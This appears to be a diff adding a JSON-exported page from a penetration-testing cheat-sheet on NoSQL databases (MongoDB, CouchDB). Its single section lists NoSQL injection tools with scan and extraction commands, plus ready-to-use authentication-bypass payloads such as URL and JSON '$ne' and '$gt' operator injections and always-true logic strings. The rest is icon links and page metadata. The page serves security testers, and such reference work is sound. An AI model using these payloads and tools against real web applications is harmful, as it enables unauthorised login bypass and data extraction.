@@ -1,0 +1,54 @@
+{
+    "title": "NoSQL (MongoDB, CouchDB)",
+    "breadcrumb": [
+        {
+            "title": "Enumeration",
+            "url": "/enumeration"
+        },
+        {
+            "title": "Web Technologies",
+            "url": "/enumeration/webservices"
+        }
+    ],
+    "sections": [
+        {
+            "heading": "Mongobleed https://github.com/joe-desimone/mongobleed",
+            "type": "paragraph",
+            "content": "# https://github.com/codingo/NoSQLMap\npython NoSQLMap.py\n# https://github.com/torque59/Nosql-Exploitation-Framework\npython nosqlframework.py -h\n# https://github.com/Charlie-belmer/nosqli\nnosqli scan -t http://localhost:4000/user/lookup?username=test\n# https://github.com/FSecureLABS/N1QLMap\n./n1qlMap.py http://localhost:3000 --request examplerequest1.txt --keyword beer-sample --extract travel-sample\n# Payload:\n' || 'a'=='a\nmongodbserver:port/status?text=1\n# in URL\nusername[$ne]=toto&password[$ne]=toto\n##in JSON\n{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}\n{\"username\": {\"$gt\":\"\"}, \"password\": {\"$gt\":\"\"}}\n- Trigger MongoDB syntax error -> ' \" \\ ; { }\n- Insert logic -> ' || '1' == '1' ; //\n- Comment out -> //\n- Operators -> $where $gt $lt $ne $regex\n- Mongo commands -> db.getCollectionNames()\n```"
+        }
+    ],
+    "images": [
+        {
+            "description": "GitHub icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/brands/github.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Chevron down icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-down.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Hashtag icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Chevron left icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-left.svg?v=2&token=a463935e93"
+        },
+        {
+            "description": "Chevron right icon",
+            "url": "https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-right.svg?v=2&token=a463935e93"
+        }
+    ],
+    "metadata": {
+        "last_updated": "2026-01-12T13:03:54.463Z",
+        "edit_url": "https://github.com/six2dez/pentest-book/blob/master/enumeration/webservices/nosql-and-and-mongodb.md",
+        "previous_page": {
+            "title": "Drupal",
+            "url": "/enumeration/webservices/drupal"
+        },
+        "next_page": {
+            "title": "PHP",
+            "url": "/enumeration/webservices/php"
+        }
+    }
+}
